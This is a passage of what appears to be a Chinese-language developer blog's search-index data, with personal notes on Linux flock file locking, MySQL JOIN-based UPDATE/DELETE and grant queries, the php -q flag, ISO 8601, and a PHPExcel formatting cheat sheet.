","date":"2019-08-21","objectID":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/:5:2","tags":["mysql"],"title":"MySQL 抓出重複資料方法","uri":"/blog/posts/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"印象中以前寫 PHP 有用過 flock 但這只用在簡單 PHP 上面 最近看到flock指令 突然想啟以前寫 PHP 有用過這個 RPubs - Linux 小撇步：利用flock來做同步和非同步應用 備份圖 裡面有提到flock 基本用法 #! /bin/bash sleep 10 date 儲存成test.sh並且打開執行權限（chmod 700 test.sh） 此時如果我們打開兩個shell, 並且約同時執行： flock /tmp/demo.lock /tmp/test.sh 簡單測試用兩個command line 測試 但我還不確定有沒有照順序執行 我有簡單開三個command line 測試 確定不會照順序執行 flock 預設為-x -c 後面下 command line，通常放在最後面 -x exclusive lock -s shared lock -n or -xn or -sn 當下有執行程式(錯誤說法)，不會執行程式 有趣的xxx.lock檔案一直都會在!!! 簡單來說就是當 shared lock，別的程式 (shared lock) 還是能執行，但是 exclusive lock 不行 反之 當 exclusive lock 程式執行， shared lock 和 exclusive lock 都不能執行!!! 可以開三個 command line 玩玩看 flock -s /tmp/demo.lock /tmp/test.sh flock -x /tmp/demo.lock /tmp/test.sh flock -sn /tmp/demo.lock /tmp/test.sh flock -xn /tmp/demo.lock /tmp/test.sh ","date":"2019-08-19","objectID":"/blog/posts/flock-%E9%98%B2%E6%AD%A2%E9%87%8D%E6%96%B0%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:0:0","tags":["flock","linux"],"title":"flock 防止重新執行方法","uri":"/blog/posts/flock-%E9%98%B2%E6%AD%A2%E9%87%8D%E6%96%B0%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["Linux"],"content":"linux lock 種類 shared lock exclusive lock 同時持有一個shared lock的process數量並沒有限制. 但同時只有一個process有exclusive lock.(Exclusive lock會拒絕其他shared lock和exclusive lock) 無論process對於檔案的存取方式為何(R/W, ReadOnly, WriteOnll), 都可以使用flock()對檔案加上shared lock或exclusive lock shared lock跟exclusive lock可以互相轉換. 但轉換的過程不是atomic的. 轉換的步驟是先移除舊的鎖然後建立新的鎖. 中間若有另一個新鎖上去, 轉換過程就會發生失敗並且失去原本的鎖。 再將shared lock轉成exclusive lock的過程中. 若有另一個process持有相同的shared lock, 那他就會被blocking, 除非他有設置LOCK_NB 參考: CODING IS ART: Linux 檔案鎖(File Locking) 備份圖 我覺得善用這個特性，寫排成會非常方便 印象中有看過程式適用ps去看關鍵字找東西 但透過這個真的會很方便，又不用寫程式!!! 更多設定方法可參考 Linux 防止 Shell 指令稿重複執行教學 - G. T. Wang 備份圖 2019-10-01 找到查看 lock 檔案方法 [Linux] 使用 lsof, lslocks, fuser 指令列出目前鎖定中的 file locks | EPH 的程式日記 process - How to list processes locking file? - Unix \u0026 Linux Stack Exchange 2019-10-26 最近上了 Swoole 課程 最近用 rclone 寫 tranmission 腳本 使用 flock 防止重覆執行 沒有預到問題 但最近我也觀查到 rclone 上傳的時候 會開很多子程序 結果是執行緒 但我沒有預到什麼問題 結果是執行緒 😜 在上 swoole 裡面有提到子程序 fork 主程序 這時候主程序會跟子程序變數做隔離 但我很好奇 flock 竟然能讓子程序繼續運作 結果是執行緒 🤷‍ 但我覺得 flock 沒辦法測試子程序執行狀況，畢竟是用 flock 指令 上面再搞笑 orz，還好有翻到這篇 補充一下， n 個 thread 都在同一個 process 所以算同一個程序，應該不會有 lock 問題 剛剛看到Ununtu htop - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天 瞬間被打臉，原來綠色不是子程序，但為什麼會有獨立的 PID? 綠色字的是 Thread ，你可以在 Setup -\u003e Display options -\u003e Hide userland process thread 選項做調整，看你要不要顯示 另外你也可以按 F5 切換 Tree view ，這樣就可以明確的看出來那些綠字的 thread 是屬於哪個 process 的 最後有看到比較詳細的介紹[筆記]Linux的thread和signal - petertc - Medium 備份圖 同process的thread會有相同的process id，且個別有thread id。對於multithread的process，process id又稱為thread group id … 圖中Command欄位是綠色代表這是一個thread，其PID欄位值其實是thread id。圖中ipython共有有三個thread（一個leader, 兩個member） 原來是我誤會大了!!難怪怎麼對 thread 做 kill 沒有效果 更多 process 介紹可以看這篇[筆記]Linux的process和signal - petertc - Medium 因為我在 Raspberry PI 觀察 [Linux] 使用 lsof, lslocks, fuser 指令列出目前鎖定中的 file locks | EPH 的程式日記 預設沒有使用 lsof 所以就不測試了 lslock COMMAND PID TYPE SIZE MODE M START END PATH cron 304 FLOCK WRITE 0 0 0 /run... flock 17094 FLOCK WRITE 0 0 0 /... (unknown) 278 FLOCK WRITE 0 0 0 /run... (unknown) 281 FLOCK WRITE 0 0 0 /run... 不知道我的 PI 怎麼了orz PATH 看不到 sudo fuser 可以看到 lock 檔案 pi@raspberrypi:~ $ sudo fuser /tmp/rclone.lock /tmp/rclone.lock: 17094 17095 flockを孫プロセスに保持させてプロセスの終了までロックを無理やり保持する 不知道這是什麼?先留一下 ","date":"2019-08-19","objectID":"/blog/posts/flock-%E9%98%B2%E6%AD%A2%E9%87%8D%E6%96%B0%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/:1:0","tags":["flock","linux"],"title":"flock 防止重新執行方法","uri":"/blog/posts/flock-%E9%98%B2%E6%AD%A2%E9%87%8D%E6%96%B0%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"最近看到 UPDATE 和 DELETE 可以搭配用 JOIN 方式 這種常常查詢資料都要搭配程式 for 迴圈實作 我覺得非常實用 我網路隨便找一個範例 SQL Fiddle ","date":"2019-08-16","objectID":"/blog/posts/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/:0:0","tags":["mysql","insert","delete"],"title":"SQL UPDATE 和 DELETE 趴配 JOIN 方法","uri":"/blog/posts/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"UPDATE … INNER JOIN UPDATE comentarios a INNER JOIN respuestas b ON a.comentario_servicio = b.respuesta_servicio SET a.comentario_servicio = 'fff', b.respuesta_servicio = 'ccc' WHERE b.respuesta_servicio = 'T.I' 透過 JOIN 方式可以同時改兩張表的資料 但還有更神奇的妙用 就是把b表換成子查詢 可以用 JOIN 方式改變a表的內容 省了寫程式 code 超級實用 UPDATE comentarios a INNER JOIN (SELECT xxx, if(xxx,ooo,bbb) as set_value FROM .... .... ... ) b ON a.comentario_servicio = b.respuesta_servicio SET a.comentario_servicio = set_value WHERE b.respuesta_servicio = 'T.I' ","date":"2019-08-16","objectID":"/blog/posts/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/:1:0","tags":["mysql","insert","delete"],"title":"SQL UPDATE 和 DELETE 趴配 JOIN 方法","uri":"/blog/posts/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"DELETE … INNER JOIN DELETE 也能搭配 JOIN 不過有點跟原本 DELETE 不太一樣 如下 DELETE a,b FROM comentarios a INNER JOIN respuestas b ON a.comentario_servicio = b.respuesta_servicio WHERE b.respuesta_servicio = 'T.I'; 通常穩們用的 DELETE 都是改from表 但 JOIN 不是這樣，是針對 DELETE 後面 table 命名 a,b 做刪除 當然也可以不用刪除兩張表 DELETE a FROM ... 或 DELETE b FROM ... 都可以指定刪除 此招也很實用 ","date":"2019-08-16","objectID":"/blog/posts/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/:2:0","tags":["mysql","insert","delete"],"title":"SQL UPDATE 和 DELETE 趴配 JOIN 方法","uri":"/blog/posts/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"鎖表的問題 上面妙招還是會有一些缺點 SQL 鎖表對一些資料表會造成些問題 有爬到mysql insert 锁机制【转】 - paul_hch - 博客园 備份圖 ","date":"2019-08-16","objectID":"/blog/posts/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/:3:0","tags":["mysql","insert","delete"],"title":"SQL UPDATE 和 DELETE 趴配 JOIN 方法","uri":"/blog/posts/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/"},{"categories":["MySQL"],"content":"其他 SQL 也有一些實用用法 INSERT INTO xxx SELECT... REPLACE INTO .... INSERT INTO .... ON DUPLICATE KEY UPDATE （mysql）replace into …与 insert into … on duplicate key update 对比分析 - Abysscarry 的博客 - CSDN 博客 mysql 中 replace into 与 insert into on duplicate key update 的使用和不同点 - 怀素真 - 博客园 MySQL 的 Replace into 与 Insert into on duplicate key update 真正的不同之处 - xlxxcc 的专栏 - CSDN 博客 ","date":"2019-08-16","objectID":"/blog/posts/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/:4:0","tags":["mysql","insert","delete"],"title":"SQL UPDATE 和 DELETE 趴配 JOIN 方法","uri":"/blog/posts/SQL-UPDATE-%E5%92%8C-DELETE-%E8%B6%B4%E9%85%8D-JOIN-%E6%96%B9%E6%B3%95/"},{"categories":["程式心法"],"content":"之前有看到這個時間格式 但一直沒有紀錄 最近剛好看到這個時間格式 筆記筆記 一開始的時候，我不知道這個時間格式是什麼名稱ISO 8601 剛好看到 php 官網PHP: DateTime - Manual const string DateTimeInterface::ISO8601 = \"Y-m-d\\TH:i:sO\" 所以才找到名稱… 有爬到這一篇詳細記錄关于“时间”的一次探索 - 前端涨姿势 - SegmentFault 思否 web1.png 因為 MySQL 不能使用 ISO 8601 儲存 所以在使用 Laravel 能不能搭配 Carbon 還需要研究，有空實作在補 ","date":"2019-08-14","objectID":"/blog/posts/ISO-8601-%E6%99%82%E9%96%93%E6%A0%BC%E5%BC%8F-XXXX-XX-XXTXX-XX-XXZ/:0:0","tags":["timezone"],"title":"ISO 8601 時間格式 XXXX-XX-XXTXX:XX:XXZ","uri":"/blog/posts/ISO-8601-%E6%99%82%E9%96%93%E6%A0%BC%E5%BC%8F-XXXX-XX-XXTXX-XX-XXZ/"},{"categories":["PHP"],"content":"最近看到公司舊的排程有這個指令 php -h 沒有看到 後來官網看到被廢棄掉 稍微研究了一下 好像跟以前執行程式有關係 $ php-cgi p.php X-Powered-By: PHP/5.5.18 Content-type: text/html hello world You can suppress these headers: $ php-cgi -q p.php hello world The php executable in recent versions of PHP doesn't need this. Using -q or not using -q gives the same result: $ php -q p.php hello world $ php p.php hello world 參考來源: What does ‘PHP -q’ do as opposed to ‘PHP’ when executing a PHP script from command line? - Quora 排程 用于监控 cron 作业和自动化任务的系统？ - VoidCC ","date":"2019-08-14","objectID":"/blog/posts/PHP-q-%E6%98%AF%E4%BB%80%E9%BA%BC%E6%8C%87%E4%BB%A4/:0:0","tags":["php"],"title":"PHP -q 是什麼指令","uri":"/blog/posts/PHP-q-%E6%98%AF%E4%BB%80%E9%BA%BC%E6%8C%87%E4%BB%A4/"},{"categories":["MySQL"],"content":"最近想看資料表有哪些 user 權限 因為不常下，所以特別筆記 permissions - mysql: Show GRANTs for all users - Database Administrators Stack Exchange 裡面有很多方法，後來挑選出這個，可搭配 where 查詢 select Host, Db, User, Insert_priv, Update_priv, Delete_priv, Create_tmp_table_priv, Alter_priv from mysql.db 查詢 MySQL 對 此帳號 開放(GRANT)哪些權限 | Tsung’s Blog SHOW GRANTS; SHOW GRANTS FOR CURRENT_USER; SHOW GRANTS FOR CURRENT_USER(); ","date":"2019-08-14","objectID":"/blog/posts/MySQL-%E6%9F%A5%E7%9C%8B%E8%B3%87%E6%96%99%E8%A1%A8%E6%AC%8A%E9%99%90/:0:0","tags":["mysql"],"title":"MySQL 查看資料表權限","uri":"/blog/posts/MySQL-%E6%9F%A5%E7%9C%8B%E8%B3%87%E6%96%99%E8%A1%A8%E6%AC%8A%E9%99%90/"},{"categories":["PHP"],"content":"最近做報表業務，有包含一些排版，對這些非常不熟 竟然都用了，紀錄一下我覺得實用筆記 PHPExcel 已經被廢棄了，取而代之的是PHPOffice/PhpSpreadsheet: A pure PHP library for reading and writing spreadsheet files 但這篇還是以 PHPExcel 為主 PHPOffice/PHPExcel: ARCHIVED PhpSpreadsheet 一些 note 可以看phpspreadsheet 开发手记 - leestar54 - 博客园 備份圖 ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:0:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"載入 PHPEXCEL PHPExcel/Classes at 1.8 · PHPOffice/PHPExcel /** PHPExcel */ require_once \"lib/excel/PHPExcel.php\"; /** PHPExcel_IOFactory */ require_once \"lib/excel/PHPExcel/IOFactory.php\"; ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:1:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"worksheet(工作表)設定 // 建立工作表並指定名稱 $index = 0; $objPHPExcel-\u003esetActiveSheetIndex($index); //設定預設顯示的工作表 // Rename sheet(sheet名稱) // 重新命名 sheet 名稱 $month_date = substr($ym, 0, 4).\".\".substr($ym, -2); $objPHPExcel-\u003egetActiveSheet()-\u003esetTitle($month_date); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:2:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"背景顏色設定 //設定背景顏色為\"鮮黃色\" (單色) $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A1:A2\")-\u003eapplyFromArray( array( \"fill\" =\u003e array( \"type\" =\u003e PHPExcel_Style_Fill::FILL_SOLID, \"color\"=\u003e array(\"rgb\" =\u003e \"FFFF00\") ), ) ); //設定背景顏色為\"淡黃色\" $backcolor = array( 'fill' =\u003e array( 'type' =\u003e PHPExcel_Style_Fill::FILL_SOLID, 'color'=\u003e array('rgb' =\u003e 'FFFFAB') ), ); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A1\")-\u003eapplyFromArray($backcolor); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A3:B3\")-\u003eapplyFromArray($backcolor); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:3:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"設定框線格式 // 設定框線格式 // 用陣列設定 全框線 $style_array = array( 'borders' =\u003e array( 'allborders' =\u003e array( 'style' =\u003e PHPExcel_Style_Border::BORDER_THIN, 'color' =\u003e array('rgb' =\u003e '000000') ), ) ); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A1:O\".$rows_count.\"\")-\u003eapplyFromArray($style_array); // 下底線 // 總計很常用到 $bottom = array( 'borders' =\u003e array( 'bottom' =\u003e array( 'style' =\u003e PHPExcel_Style_Border::BORDER_MEDIUM, 'color' =\u003e array('rgb' =\u003e '000000') ), ) ); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:4:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"字體設定 // 設定字型大小 $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A1\")-\u003egetFont()-\u003esetSize(11); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A2:B10\")-\u003egetFont()-\u003esetSize(10); // 粗體 $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A1:B2\")-\u003egetFont()-\u003esetBold(true); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A6:I6\")-\u003egetFont()-\u003esetBold(true); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"N2\")-\u003egetFont()-\u003esetBold(false); // 動態算位置技巧 $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A\".($rows_count).\":O\".($rows_count).\"\")-\u003egetFont()-\u003esetBold(true); // 自動換行 $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A3:B3\")-\u003egetAlignment()-\u003esetWrapText(true); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:5:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"欄位給予值 //設定A1欄位顯示文字2015-08 $month_date = substr($ym, 0, 4).\"-\".substr($ym, -2); $objPHPExcel-\u003egetActiveSheet()-\u003esetCellValue(\"A1\", $month_date ); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:6:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"欄位類型 //設定成數字 $objPHPExcel-\u003egetActiveSheet()-\u003egetCell(\"B20\")-\u003esetValueExplicit(1000, PHPExcel_Cell_DataType::TYPE_NUMERIC); //設定成百分比 $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"B20\")-\u003egetNumberFormat()-\u003esetFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:7:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"欄位對齊方式 //水平對齊 setVertiacl 垂直對齊 setHorizontal /* VERTICAL_CENTER 垂直置中 VERTICAL_TOP HORIZONTAL_CENTER HORIZONTAL_RIGHT HORIZONTAL_LEFT HORIZONTAL_JUSTIFY */ $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A1:B3\")-\u003egetAlignment()-\u003esetHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A1:B3\")-\u003egetAlignment()-\u003esetVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A1:A\".$rows_count.\"\")-\u003egetAlignment()-\u003esetHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"B1:B\".$rows_count.\"\")-\u003egetAlignment()-\u003esetHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER); /** * 合併儲存格 */ $objPHPExcel-\u003egetActiveSheet()-\u003emergeCells(\"A1:B1\"); // or $objPHPExcel-\u003esetActiveSheetIndex(0)-\u003emergeCells('A1:C1'); /** * 取消 合併儲存格 **/ // [How to Merge/unmerge cells in PHPExcel | Degree Documentation](https://degreedocumentation.wordpress.com/2012/08/17/how-to-mergeunmerge-cells/) $objPHPExcel-\u003egetActiveSheet()-\u003eunmergeCells('A18:E22'); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:8:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"字體顏色 // 設定字體顏色 /* 這裡有列出可用英文單字表示的顏色，並不多。 COLOR_BLACK COLOR_BLUE COLOR_DARKBLUE COLOR_DARKGREEN COLOR_DARKRED COLOR_DARKYELLOW COLOR_GREEN COLOR_RED COLOR_WHITE COLOR_YELLOW */ $gray = array( 'font' =\u003e array( 'color' =\u003e array('rgb' =\u003e 'BABABA'), )); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"I1:I7\")-\u003eapplyFromArray($gray); $yellow = array( 'fill' =\u003e array( 'type' =\u003e PHPExcel_Style_Fill::FILL_SOLID, 'color' =\u003e array('rgb' =\u003e 'FFFF00'), )); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"F1:F2\")-\u003eapplyFromArray($yellow); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"I2\")-\u003eapplyFromArray($yellow); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:9:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"欄位寬度、高度設定 //設定 cell 高度 // 设置默认行高 getDefaultRowDimension $objPHPExcel-\u003egetActiveSheet()-\u003egetDefaultRowDimension()-\u003esetRowHeight(12); $objPHPExcel-\u003egetActiveSheet()-\u003egetRowDimension(1)-\u003esetRowHeight(16); $objPHPExcel-\u003egetActiveSheet()-\u003egetRowDimension(2)-\u003esetRowHeight(16); $objPHPExcel-\u003egetActiveSheet()-\u003egetRowDimension(3)-\u003esetRowHeight(36); //設定的欄位寬度(+0.71才正確) $objPHPExcel-\u003egetActiveSheet()-\u003egetColumnDimension('A')-\u003esetWidth(17); $objPHPExcel-\u003egetActiveSheet()-\u003egetColumnDimension('B')-\u003esetWidth(6); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:10:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"欄位數值資料格式 // 網底 $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"A1\")-\u003egetFill()-\u003esetFillType(PHPExcel_Style_Fill::FILL_PATTERN_LIGHTTRELLIS); // 設定成數字，並且有千分位逗號 // excel格式設定裡的#：代表數字，多餘的0會去掉。 // excel格式設定裡的0:基本上跟#一樣，但是多餘的0會保留。 $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"D4:D\".($rows_count).\"\")-\u003egetNumberFormat()-\u003esetFormatCode('#,##0'); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"O4:O\".($rows_count).\"\")-\u003egetNumberFormat()-\u003esetFormatCode('$#,##0'); // 設定成百分比 // 設定拆款百分比30.00% $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"E3:E\".($rows_count).\"\")-\u003egetNumberFormat()-\u003esetFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"G3:G\".($rows_count).\"\")-\u003egetNumberFormat()-\u003esetFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE_00); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(\"H3:H\".($rows_count).\"\")-\u003egetNumberFormat()-\u003esetFormatCode(PHPExcel_Style_NumberFormat::FORMAT_PERCENTAGE); $objPHPExcel-\u003egetActiveSheet()-\u003egetCell('H4')-\u003esetValueExplicit('0.3', PHPExcel_Cell_DataType::TYPE_NUMERIC); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:11:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"凍結窗格 //凍結窗格 $objPHPExcel-\u003egetActiveSheet()-\u003efreezePane('A6'); $objPHPExcel-\u003egetActiveSheet()-\u003efreezePane('D6'); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:12:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"建立新的 $objPHPExcel-\u003ecreateSheet(); //建立新的工作表 $objPHPExcel-\u003esetActiveSheetIndex($index+1);//現編輯頁 $objPHPExcel-\u003egetActiveSheet()-\u003esetTitle(\"標題名稱\"); //設定標題 ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:13:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"動態處理橫軸資料(A~AZ) PHPExcel 可以用 $objPHPExcel-\u003egetActiveSheet()-\u003esetCellValue(\"A1\", $month_date ); 塞值真的非常方便 但是沒辦法動態產生資料 可以透過setCellValueByColumnAndRow 但注意第一個欄(column 英文)是從 0 開始 列是從 1 開始 $objPHPExcel-\u003egetActiveSheet()-\u003esetCellValueByColumnAndRow(0, 1,\"2019-04月\"); 但還有一個問題，就是轉換 getStyle 沒有這類似 function PHPExcel_Cell::stringFromColumnIndex 可以簡單轉換 stringFromColumnIndex(0) = ‘A’ \u003c=\u003e columnIndexFromString // 一般 $objPHPExcel-\u003egetActiveSheet()-\u003esetCellValueByColumnAndRow(0, 1,.\"2019-04月\"); // 合併儲存格 $objPHPExcel-\u003egetActiveSheet()-\u003emergeCellsByColumnAndRow( $index, 1, $index + 8 , 1); // PHPExcel_Cell::stringFromColumnIndex $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(PHPExcel_Cell::stringFromColumnIndex( $index ).'1')-\u003egetAlignment()-\u003esetHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER); $objPHPExcel-\u003egetActiveSheet()-\u003egetStyle(PHPExcel_Cell::stringFromColumnIndex( $index ).'1')-\u003egetAlignment()-\u003esetVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER); // 公式運算方法 $col1 = PHPExcel_Cell::stringFromColumnIndex($index + 1); $col2 = PHPExcel_Cell::stringFromColumnIndex($index + 2); $col3 = PHPExcel_Cell::stringFromColumnIndex($index + 3); $objPHPExcel-\u003egetActiveSheet()-\u003esetCellValueByColumnAndRow($o2, '4',\"={$col1}4+{$col2}4+{$col3}4\"); $objPHPExcel-\u003egetActiveSheet()-\u003esetCellValueByColumnAndRow($o2, '4',\"=SUM({$scol}$5:{$scol}$\".($nu+4).\")\"); ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:14:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"匯出 EXCEL // Export to Excel2007 (.xlsx) $objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, \"Excel2007\"); $objWriter-\u003esave('export/filename.xlsx'); Ron, Run ~~: PHPExcel - 如何設定儲存格代號 PHP 輸出 Excel ，使用 PHPExcel PHP excel 設置參數 - IT 閱讀 ","date":"2019-08-08","objectID":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/:15:0","tags":["phpexcel"],"title":"PHPExcel 使用小記","uri":"/blog/posts/PHPExcel-%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/"},{"categories":["PHP"],"content":"其他程式使用方式 Java 使用 POI 方式 但我覺得不好用…. JavaScript 有找到 js-xlsx，做匯入資料感覺非常方便 一般報表還可以，複雜格式報表可能不行 但是進階設定需要付費，所以還是很可惜 Node 读写 Excel 文件探究实践 | Aotu.io「凹凸实验室」 【node+demo】使用 xlsx-style 设置表格的宽高等样式 - 简书 使用 js-xlsx 纯前端导出 excel - 个人文章 - SegmentFault 思否 不知道為什麼範例沒辦法用出顏色 網路文章: Merge Cell values with PHPExcel - PHP - Stack Overflow PHP 輸出 Excel ，使用 PHPExcel 基于 Excel 模板导出——ExcelTemplate - gezhonglei2007 的专栏 - CSDN 博客 phpspreadsheet 开发手记 - leestar54 - 博客园 columnIndexFromString and stringFromColumnIndex are not compatible · Issue #307 · PHPOffice/PHPExcel merge cells from Array of Arrays · Issue #964 · SheetJS/js-xlsx 纯前端利用 js-xlsx 之单元格样式(4) - 简书 PHPExcel Notes and code snippets 